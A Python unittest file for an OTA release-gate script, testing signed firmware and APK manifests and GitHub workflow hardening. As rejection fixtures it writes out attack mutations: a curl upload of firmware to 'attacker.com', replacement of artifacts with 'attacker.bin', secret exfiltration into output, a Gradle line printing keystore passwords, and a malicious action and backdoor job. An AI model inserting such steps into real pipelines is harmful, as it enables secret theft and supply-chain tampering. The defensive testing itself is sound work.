import argparse
import base64
import copy
import hashlib
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

import ota_contract_gate as gate  # noqa: E402


TEST_PRIVATE_KEY_HEX = (
    "9d61b19deffd5a60ba844af492ec2cc4"
    "4449c5697b326919703bac031cae7f60"
)


class OtaContractGateTest(unittest.TestCase):
  def _workflow_sources(self) -> dict[str, str]:
    return {
        path: (gate.ROOT / path).read_text(encoding="utf-8")
        for path in gate.WORKFLOW_ARTIFACT_BINDINGS
    }

  def _write_release_fixture(
      self,
      directory: Path,
      artifact_type: str,
      artifact_bytes: bytes,
      write_artifact: bool = True,
  ) -> tuple[Path, Path, dict]:
    vector_name = (
        "target-valid.json"
        if artifact_type == "target-firmware"
        else "mobile-valid.json"
    )
    manifest = gate.load_json(gate.OTA / "test-vectors" / vector_name)
    manifest["sha256"] = hashlib.sha256(artifact_bytes).hexdigest()
    size_field = (
        "artifact_size" if artifact_type == "target-firmware" else "apk_size"
    )
    manifest[size_field] = len(artifact_bytes)
    if artifact_type == "android-apk":
      manifest["signing_certificate_digest"] = "a" * 64
    private_key = Ed25519PrivateKey.from_private_bytes(
        bytes.fromhex(TEST_PRIVATE_KEY_HEX)
    )
    manifest["signature"] = base64.b64encode(
        private_key.sign(gate.canonical_signed_bytes(manifest))
    ).decode("ascii")

    manifest_path = directory / "manifest.json"
    artifact_path = directory / (
        "firmware.bin" if artifact_type == "target-firmware" else "app.apk"
    )
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
    if write_artifact:
      artifact_path.write_bytes(artifact_bytes)
    return manifest_path, artifact_path, manifest

  def test_contract_assets_and_dual_slot_pass(self):
    gate.validate_contract()

  def test_target_tamper_is_rejected(self):
    manifest = gate.load_json(gate.OTA / "test-vectors" / "target-valid.json")
    tampered = copy.deepcopy(manifest)
    tampered["sha256"] = "f" * 64
    with self.assertRaisesRegex(gate.GateError, "signature"):
      gate.validate_manifest(
          tampered, "target-manifest.schema.json", gate.TEST_PUBLIC_KEY_HEX
      )

  def test_mobile_fallback_must_be_independent(self):
    manifest = gate.load_json(gate.OTA / "test-vectors" / "mobile-valid.json")
    manifest["fallback_url"] = manifest["apk_url"]
    with self.assertRaisesRegex(gate.GateError, "fallback_url"):
      gate.validate_manifest(
          manifest, "mobile-manifest.schema.json", gate.TEST_PUBLIC_KEY_HEX
      )

  def test_pending_hardware_evidence_blocks_release(self):
    with self.assertRaisesRegex(gate.GateError, "incomplete gates"):
      gate.validate_release_evidence(gate.OTA / "release-evidence.json")

  def test_release_manifest_requires_matching_pinned_key(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "target-firmware", b"valid firmware bytes"
      )
      gate.validate_release_manifests(
          [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
      )
      with self.assertRaisesRegex(gate.GateError, "signature"):
        gate.validate_release_manifests([manifest], [artifact], "00" * 32)

  def test_target_manifest_producer_binds_exact_bytes_and_workflow_identity(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      directory = Path(temporary_directory)
      artifact = directory / "firmware.bin"
      artifact.write_bytes(b"exact target firmware bytes")
      manifest = directory / "version.json"
      create_args = argparse.Namespace(
          artifact=artifact,
          output=manifest,
          version="2.1.0-g1234567",
          commit="1" * 40,
          build_id="public-canary-" + "1" * 40,
          artifact_url="https://target-canary.invalid/firmware.bin",
          published_at="2026-08-01T00:00:00Z",
          mandatory_after=None,
          signing_key_id="rfc8032-test-key-1",
          private_key_env="TARGET_TEST_PRIVATE_KEY_HEX",
          expected_public_key_hex=gate.TEST_PUBLIC_KEY_HEX,
          protocol_min=1,
          protocol_max=2,
      )
      with mock.patch.dict(
          os.environ,
          {"TARGET_TEST_PRIVATE_KEY_HEX": TEST_PRIVATE_KEY_HEX},
          clear=False,
      ):
        gate.create_target_manifest(create_args)
      verify_args = argparse.Namespace(
          manifest=manifest,
          artifact=artifact,
          public_key_hex=gate.TEST_PUBLIC_KEY_HEX,
          expected_version=create_args.version,
          expected_commit=create_args.commit,
          expected_build_id=create_args.build_id,
      )
      gate.verify_target_manifest(verify_args)
      artifact.write_bytes(b"substituted target firmware bytes")
      with self.assertRaisesRegex(gate.GateError, "exact firmware bytes"):
        gate.verify_target_manifest(verify_args)

  def test_target_manifest_verifier_rejects_version_commit_and_build_mutations(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      directory = Path(temporary_directory)
      artifact = directory / "firmware.bin"
      artifact.write_bytes(b"target identity bytes")
      manifest = directory / "version.json"
      create_args = argparse.Namespace(
          artifact=artifact,
          output=manifest,
          version="2.1.0-gabcdef0",
          commit="a" * 40,
          build_id="run-100",
          artifact_url="https://target-canary.invalid/firmware.bin",
          published_at="2026-08-01T00:00:00Z",
          mandatory_after=None,
          signing_key_id="rfc8032-test-key-1",
          private_key_env="TARGET_TEST_PRIVATE_KEY_HEX",
          expected_public_key_hex=gate.TEST_PUBLIC_KEY_HEX,
          protocol_min=1,
          protocol_max=2,
      )
      with mock.patch.dict(
          os.environ,
          {"TARGET_TEST_PRIVATE_KEY_HEX": TEST_PRIVATE_KEY_HEX},
          clear=False,
      ):
        gate.create_target_manifest(create_args)
      for field, value, message in (
          ("expected_version", "wrong", "version"),
          ("expected_commit", "b" * 40, "commit"),
          ("expected_build_id", "wrong-run", "build ID"),
      ):
        verify_args = argparse.Namespace(
            manifest=manifest,
            artifact=artifact,
            public_key_hex=gate.TEST_PUBLIC_KEY_HEX,
            expected_version=create_args.version,
            expected_commit=create_args.commit,
            expected_build_id=create_args.build_id,
        )
        setattr(verify_args, field, value)
        with self.subTest(field=field):
          with self.assertRaisesRegex(gate.GateError, message):
            gate.verify_target_manifest(verify_args)

  def test_release_missing_artifact_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory),
          "target-firmware",
          b"expected firmware bytes",
          write_artifact=False,
      )
      with self.assertRaisesRegex(gate.GateError, "missing or not a file"):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_release_artifact_byte_substitution_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "target-firmware", b"artifact-A"
      )
      artifact.write_bytes(b"artifact-B")
      with self.assertRaisesRegex(gate.GateError, "SHA-256"):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_release_artifact_truncation_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "target-firmware", b"complete artifact"
      )
      artifact.write_bytes(b"truncated")
      with self.assertRaisesRegex(gate.GateError, "byte length"):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_release_apk_certificate_mismatch_is_rejected(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "android-apk", b"signed apk bytes"
      )
      with mock.patch.object(
          gate,
          "read_apk_signing_certificate_digests",
          return_value={"b" * 64},
      ):
        with self.assertRaisesRegex(gate.GateError, "certificate digest"):
          gate.validate_release_manifests(
              [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
          )

  def test_release_apk_artifact_and_certificate_binding_passes(self):
    with tempfile.TemporaryDirectory() as temporary_directory:
      manifest, artifact, _ = self._write_release_fixture(
          Path(temporary_directory), "android-apk", b"signed apk bytes"
      )
      with mock.patch.object(
          gate,
          "read_apk_signing_certificate_digests",
          return_value={"a" * 64},
      ):
        gate.validate_release_manifests(
            [manifest], [artifact], gate.TEST_PUBLIC_KEY_HEX
        )

  def test_state_preservation_and_invariant_arrays_cannot_be_empty(self):
    for component in ("target", "mobile"):
      for collection in ("failure_preserves", "invariants"):
        with self.subTest(component=component, collection=collection):
          document = gate.load_json(gate.OTA / "state-machines.json")
          document[component][collection] = []
          with self.assertRaisesRegex(gate.GateError, "schema validation"):
            gate.validate_state_machines(document)

  def test_required_state_preservation_or_invariant_cannot_be_removed(self):
    for component in ("target", "mobile"):
      for collection in ("failure_preserves", "invariants"):
        with self.subTest(component=component, collection=collection):
          document = gate.load_json(gate.OTA / "state-machines.json")
          document[component][collection].pop()
          with self.assertRaisesRegex(gate.GateError, "required set"):
            gate.validate_state_machines(document)

  def test_state_initial_and_terminal_success_are_fixed(self):
    document = gate.load_json(gate.OTA / "state-machines.json")
    document["target"]["initial"] = "WAIT_SAFE_STATE"
    with self.assertRaisesRegex(gate.GateError, "initial must be IDLE"):
      gate.validate_state_machines(document)
    document = gate.load_json(gate.OTA / "state-machines.json")
    document["mobile"]["terminal_success"] = "NEW_APP_FIRST_RUN_HEALTH"
    with self.assertRaisesRegex(gate.GateError, "terminal_success must be COMPLETE"):
      gate.validate_state_machines(document)

  def test_destructive_recovery_outcome_and_action_are_rejected(self):
    for field, destructive_text in (
        ("outcome", "installed-apk-erased"),
        ("action", "erase-installed-app"),
    ):
      with self.subTest(field=field):
        recovery = gate.load_json(gate.OTA / "recovery-matrix.json")
        recovery["rows"][0]["mobile"][field] = destructive_text
        with self.assertRaisesRegex(gate.GateError, "schema validation"):
          gate.validate_recovery_and_faults(recovery=recovery)

  def test_allowlisted_but_wrong_recovery_action_is_rejected(self):
    recovery = gate.load_json(gate.OTA / "recovery-matrix.json")
    recovery["rows"][0]["mobile"]["action"] = "retain-installed-apk"
    with self.assertRaisesRegex(gate.GateError, "required semantics"):
      gate.validate_recovery_and_faults(recovery=recovery)

  def test_unsafe_recovery_state_transition_is_rejected(self):
    recovery = gate.load_json(gate.OTA / "recovery-matrix.json")
    recovery["rows"][5]["target"]["to_state"] = "FAILED_RETRYABLE"
    with self.assertRaisesRegex(gate.GateError, "required semantics"):
      gate.validate_recovery_and_faults(recovery=recovery)

  def test_fault_outcome_semantic_inversion_is_rejected(self):
    plan = gate.load_json(gate.OTA / "fault-injection-plan.json")
    plan["tests"][0]["expected"] = "metadata-rejected"
    with self.assertRaisesRegex(gate.GateError, "not fail-safe"):
      gate.validate_recovery_and_faults(plan=plan)

  def test_workflow_cannot_upload_without_validating_same_artifact(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "--artifact dist/gatekeeper-firmware.bin",
        "--artifact dist/unbound-firmware.bin",
    )
    with self.assertRaisesRegex(gate.GateError, "artifact binding"):
      gate.validate_workflow_artifact_bindings(workflows)

  def test_push_builds_canary_without_entering_production_release_job(self):
    gate.validate_workflow_release_triggers(self._workflow_sources())

  def test_push_condition_cannot_authorize_production_release(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "github.event_name == 'workflow_dispatch' &&\n"
        "      inputs.release_target == 'production'",
        "github.event_name == 'push' && github.ref == 'refs/heads/main'",
    )
    with self.assertRaisesRegex(gate.GateError, "authorized production trigger"):
      gate.validate_workflow_release_triggers(workflows)

  def test_explicit_release_cannot_bypass_evidence_validation(self):
    workflows = self._workflow_sources()
    app_workflow = ".github/workflows/build_app.yml"
    workflows[app_workflow] = workflows[app_workflow].replace(
        "python scripts/ota_contract_gate.py release", "echo bypass-release-gate"
    )
    with self.assertRaisesRegex(gate.GateError, "release evidence validation"):
      gate.validate_workflow_release_triggers(workflows)

  def test_explicit_release_cannot_bypass_pinned_signing_trust(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        '--public-key-hex "$UNTRUSTED_KEY"',
    )
    with self.assertRaisesRegex(gate.GateError, "production release isolation"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_condition_cannot_be_extended_with_push(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "inputs.release_target == 'production'",
        "inputs.release_target == 'production' || github.event_name == 'push'",
    )
    with self.assertRaisesRegex(gate.GateError, "exact production condition"):
      gate.validate_workflow_release_triggers(workflows)

  def test_evidence_step_cannot_be_conditionally_disabled(self):
    workflows = self._workflow_sources()
    app_workflow = ".github/workflows/build_app.yml"
    workflows[app_workflow] = workflows[app_workflow].replace(
        "      - name: Enforce OTA production release evidence\n",
        "      - name: Enforce OTA production release evidence\n"
        "        if: ${{ false }}\n",
    )
    with self.assertRaisesRegex(gate.GateError, "evidence step"):
      gate.validate_workflow_release_triggers(workflows)

  def test_signing_key_must_come_exactly_from_production_secret(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.OTA_SIGNING_PUBLIC_KEY_HEX }}",
        f"OTA_SIGNING_PUBLIC_KEY_HEX: {gate.TEST_PUBLIC_KEY_HEX}",
    )
    with self.assertRaisesRegex(gate.GateError, "production signing secret"):
      gate.validate_workflow_release_triggers(workflows)

  def test_artifact_cannot_be_modified_after_release_validation(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "      - name: Deploy to Synology NAS via SFTP\n",
        "      - name: Replace validated firmware\n"
        "        run: cp attacker.bin dist/gatekeeper-firmware.bin\n\n"
        "      - name: Deploy to Synology NAS via SFTP\n",
    )
    with self.assertRaisesRegex(gate.GateError, "immutable release steps"):
      gate.validate_workflow_artifact_bindings(workflows)

  def test_firmware_and_apk_workflows_cover_pull_requests(self):
    for path, content in self._workflow_sources().items():
      with self.subTest(path=path):
        workflow = gate.load_workflow_yaml(path, content)
        self.assertIn("pull_request", workflow["on"])

  def test_firmware_public_canary_is_secret_free_and_artifact_bound(self):
    workflows = self._workflow_sources()
    gate.validate_firmware_build_workflow(workflows)
    gate.validate_workflow_release_triggers(workflows)
    path = ".github/workflows/deploy.yml"
    parsed = gate.load_workflow_yaml(path, workflows[path])
    build_job = parsed["jobs"]["test_and_build"]
    serialized = json.dumps(build_job, sort_keys=True)
    self.assertNotIn("${{ secrets.", serialized)
    self.assertIn("https://target-canary.invalid/", serialized)

  def test_every_public_build_job_rejects_secret_in_run_env_or_artifact_producer(self):
    for path, job_name, producer_name in (
        (
            ".github/workflows/deploy.yml",
            "test_and_build",
            "Prepare signed public firmware canary",
        ),
        (
            ".github/workflows/build_app.yml",
            "build_apk",
            "Prepare public mobile canary metadata",
        ),
    ):
      for location in ("env", "run"):
        with self.subTest(path=path, location=location):
          workflows = self._workflow_sources()
          parsed = gate.load_workflow_yaml(path, workflows[path])
          producer = next(
              step
              for step in parsed["jobs"][job_name]["steps"]
              if step.get("name") == producer_name
          )
          if location == "env":
            producer["env"] = {
                "EXFILTRATED": "${{ secrets.SECRET_OTA_FIRMWARE_URL }}"
            }
          else:
            producer["run"] += (
                '\nprintf "%s" "${{ secrets.SECRET_OTA_FIRMWARE_URL }}" '
                ">> dist/version.json\n"
            )
          workflows[path] = gate.yaml.safe_dump(parsed, sort_keys=False)
          with self.assertRaisesRegex(
              gate.GateError, "zero production secret|production secret"
          ):
            gate.validate_workflow_release_triggers(workflows)

  def test_branch_dispatch_cannot_reach_keystore_or_runtime_secrets_after_gradle_mutation(self):
    workflows = self._workflow_sources()
    # This represents an unprotected candidate-only Gradle mutation. It does not
    # alter the protected workflow bundle and therefore must have no secret-bearing
    # branch-dispatch job available to execute it.
    malicious_gradle = (
        'println(System.getenv("KEYSTORE_PASSWORD")); '
        'println(System.getenv("GATEKEEPER_API_KEY"))'
    )
    self.assertIn("KEYSTORE_PASSWORD", malicious_gradle)
    gate.validate_workflow_release_triggers(workflows)
    parsed = gate.load_workflow_yaml(
        ".github/workflows/build_app.yml",
        workflows[".github/workflows/build_app.yml"],
    )
    build_serialized = json.dumps(parsed["jobs"]["build_apk"], sort_keys=True)
    self.assertNotIn("${{ secrets.", build_serialized)
    self.assertNotIn("upload-keystore.jks", build_serialized)
    release_condition = " ".join(
        str(parsed["jobs"]["release_to_production"]["if"]).split()
    )
    self.assertEqual(
        release_condition,
        "github.event_name == 'workflow_dispatch' && "
        "inputs.release_target == 'production' && "
        "github.ref == 'refs/heads/main'",
    )

  def test_release_main_ref_and_secret_after_verification_order_are_immutable(self):
    for path in self._workflow_sources():
      with self.subTest(path=path, mutation="main-ref"):
        workflows = self._workflow_sources()
        workflows[path] = workflows[path].replace(
            "      github.ref == 'refs/heads/main'\n",
            "      github.ref != 'refs/heads/main'\n",
            1,
        )
        with self.assertRaisesRegex(gate.GateError, "authorized production trigger"):
          gate.validate_workflow_release_triggers(workflows)

      with self.subTest(path=path, mutation="secret-before-verification"):
        workflows = self._workflow_sources()
        parsed = gate.load_workflow_yaml(path, workflows[path])
        steps = parsed["jobs"]["release_to_production"]["steps"]
        verify_index = next(
            index
            for index, step in enumerate(steps)
            if step.get("name") == "Verify exact protected main release source"
        )
        secret_index = next(
            index
            for index, step in enumerate(steps)
            if "${{ secrets." in json.dumps(step, sort_keys=True)
        )
        secret_step = steps.pop(secret_index)
        steps.insert(verify_index, secret_step)
        workflows[path] = gate.yaml.safe_dump(parsed, sort_keys=False)
        with self.assertRaisesRegex(
            gate.GateError, "step.*name mismatch|only after exact protected main"
        ):
          gate.validate_workflow_release_triggers(workflows)

  def test_build_job_cannot_use_production_environment(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "    name: Test and build firmware canary\n",
        "    name: Test and build firmware canary\n    environment: production\n",
    )
    with self.assertRaisesRegex(gate.GateError, "build job must not use production environment"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_job_cannot_have_step_after_sftp_deploy(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "          sftp_only: true\n",
        "          sftp_only: true\n\n      - name: Malicious post-deploy step\n        run: echo compromised\n",
    )
    with self.assertRaisesRegex(gate.GateError, "no steps allowed after SFTP deploy"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_job_needs_must_specify_build_job(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "    needs: test_and_build\n",
        "",
    )
    with self.assertRaisesRegex(gate.GateError, "needs must include"):
      gate.validate_workflow_release_triggers(workflows)

  def test_evidence_step_env_secret_override_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.OTA_SIGNING_PUBLIC_KEY_HEX }}",
        "OTA_SIGNING_PUBLIC_KEY_HEX: ${{ secrets.SOME_OTHER_KEY }}",
    )
  def test_evidence_step_continue_on_error_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "      - name: Enforce OTA production release evidence\n",
        "      - name: Enforce OTA production release evidence\n        continue-on-error: true\n",
    )
    with self.assertRaisesRegex(gate.GateError, "continue-on-error"):
      gate.validate_workflow_release_triggers(workflows)

  def test_release_command_error_swallowing_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" || true',
    )
    with self.assertRaisesRegex(gate.GateError, "swallow errors"):
      gate.validate_workflow_release_triggers(workflows)

  def test_signing_key_redefinition_in_run_script_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "        run: |\n          python scripts/ota_contract_gate.py release \\",
        "        run: |\n          OTA_SIGNING_PUBLIC_KEY_HEX=attacker_key\n          python scripts/ota_contract_gate.py release \\",
        1,
    )
    with self.assertRaisesRegex(gate.GateError, "redefined in run script"):
      gate.validate_workflow_release_triggers(workflows)

  def test_same_step_artifact_mutation_after_validation_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"\n          cp attacker.bin dist/gatekeeper-firmware.bin',
    )
    with self.assertRaisesRegex(gate.GateError, "alter artifacts after validation"):
      gate.validate_workflow_release_triggers(workflows)

  def test_sftp_local_path_rebinding_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "local_path: './dist/*'",
        "local_path: './unbound/*'",
    )
    with self.assertRaisesRegex(gate.GateError, "local_path must be strictly"):
      gate.validate_workflow_release_triggers(workflows)

  def test_duplicate_or_early_sftp_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "      - name: Enforce OTA production release evidence\n",
        "      - name: Early SFTP\n        uses: wlixcc/SFTP-Deploy-Action@v1.2.4\n      - name: Enforce OTA production release evidence\n",
    )
    with self.assertRaisesRegex(gate.GateError, "exactly one SFTP deploy step"):
      gate.validate_workflow_release_triggers(workflows)


  def test_object_form_build_environment_is_rejected(self):
    workflows = self._workflow_sources()
    target_workflow = ".github/workflows/deploy.yml"
    workflows[target_workflow] = workflows[target_workflow].replace(
        "    name: Test and build firmware canary\n",
        "    name: Test and build firmware canary\n    environment:\n      name: production\n",
    )
    with self.assertRaisesRegex(gate.GateError, "must not use production environment|must not specify environment"):
      gate.validate_workflow_release_triggers(workflows)


  def test_same_line_evidence_error_swallowing_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" || true',
        )
        with self.assertRaisesRegex(gate.GateError, "swallow errors"):
          gate.validate_workflow_release_triggers(workflows)

  def test_same_line_post_validation_artifact_replacement_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX" && cp attacker.bin dist/artifact',
        )
        with self.assertRaisesRegex(gate.GateError, "swallow errors|alter artifacts|flags mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_printf_or_read_signing_key_rebinding_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            '--public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
            'printf -v OTA_SIGNING_PUBLIC_KEY_HEX "000"\n          --public-key-hex "$OTA_SIGNING_PUBLIC_KEY_HEX"',
        )
        with self.assertRaisesRegex(gate.GateError, "redefined in run script|flags mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_duplicate_evidence_step_identity_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "      - name: Enforce OTA production release evidence\n",
            "      - name: Enforce OTA production release evidence\n"
            "        run: python scripts/ota_contract_gate.py release --evidence ota/release-evidence.json --manifest dist/version.json --artifact dist/gatekeeper-firmware.bin --public-key-hex \"$OTA_SIGNING_PUBLIC_KEY_HEX\"\n"
            "      - name: Enforce OTA production release evidence\n",
        )
        with self.assertRaisesRegex(gate.GateError, "step count must be exactly|order violated"):
          gate.validate_workflow_release_triggers(workflows)

  def test_alternate_scp_sftp_action_variants_are_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "wlixcc/SFTP-Deploy-Action@v1.2.4",
            "appleboy/scp-action@master",
        )
        with self.assertRaisesRegex(gate.GateError, "uses mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_ordinary_build_job_curl_upload_file_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "    steps:\n",
            "    steps:\n      - name: Curl upload exfiltration\n        run: curl --upload-file dist/firmware.bin ftp://attacker.com/\n",
        )
        with self.assertRaisesRegex(gate.GateError, "production or SFTP deployment capability"):
          gate.validate_workflow_release_triggers(workflows)

  def test_arbitrary_unknown_action_uses_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "    steps:\n",
            "    steps:\n      - name: Unknown action\n        uses: hacker/malicious-action@v1\n",
        )
        with self.assertRaisesRegex(gate.GateError, "unallowed action"):
          gate.validate_workflow_release_triggers(workflows)

  def test_arbitrary_unknown_step_in_release_job_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "  release_to_production:\n",
            "  release_to_production:\n    # extra step\n",
        )
        # Add an extra step inside release_to_production steps
        workflows[target_workflow] = workflows[target_workflow].replace(
            "      - name: Checkout exact main source\n",
            "      - name: Extra unauthorized step\n        run: echo compromised\n      - name: Checkout exact main source\n",
            1,
        )
        with self.assertRaisesRegex(gate.GateError, "step count must be|order violated|name mismatch"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_top_level_key_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = "env:\n  MALICIOUS: 'true'\n" + workflows[target_workflow]
        with self.assertRaisesRegex(gate.GateError, "top-level contains unallowed keys"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_job_in_workflow_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "jobs:\n",
            "jobs:\n  extra_backdoor_job:\n    runs-on: ubuntu-latest\n    steps: []\n",
        )
        with self.assertRaisesRegex(gate.GateError, "unexpected job in workflow"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_top_level_permissions_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "permissions:\n  contents: read",
            "permissions:\n  contents: write",
        )
        with self.assertRaisesRegex(gate.GateError, "top-level permissions must be exact mapping"):
          gate.validate_workflow_release_triggers(workflows)

  def test_unallowed_trigger_in_workflow_is_rejected_both_workflows(self):
    for target_workflow in [".github/workflows/deploy.yml", ".github/workflows/build_app.yml"]:
      with self.subTest(workflow=target_workflow):
        workflows = self._workflow_sources()
        workflows[target_workflow] = workflows[target_workflow].replace(
            "on:\n",
            "on:\n  schedule:\n    - cron: '* * * * *'\n",
            1
        )
        with self.assertRaisesRegex(gate.GateError, "workflow contains unallowed triggers"):
          gate.validate_workflow_release_triggers(workflows)

  def test_mobile_workflow_binds_tests_trust_root_and_signed_metadata(self):
    gate.validate_mobile_build_workflow(self._workflow_sources())

  def test_mobile_workflow_rejects_removed_or_weakened_format_check(self):
    path = ".github/workflows/build_app.yml"
    workflows = self._workflow_sources()
    workflows[path] = workflows[path].replace(
        "dart format --output=none --set-exit-if-changed lib test",
        "dart format lib test",
        1,
    )
    with self.assertRaisesRegex(gate.GateError, "formatting check"):
      gate.validate_mobile_build_workflow(workflows)

  def test_mobile_release_or_pr_trust_define_removal_is_rejected(self):
    path = ".github/workflows/build_app.yml"
    fragments = {
        '--dart-define=APK_VERSION_URL="$APK_VERSION_URL"': gate.validate_workflow_release_triggers,
        '--dart-define=APK_FALLBACK_VERSION_URL="$APK_FALLBACK_VERSION_URL"': gate.validate_workflow_release_triggers,
        '--dart-define=UPDATE_SIGNING_KEY_ID="$UPDATE_SIGNING_KEY_ID"': gate.validate_workflow_release_triggers,
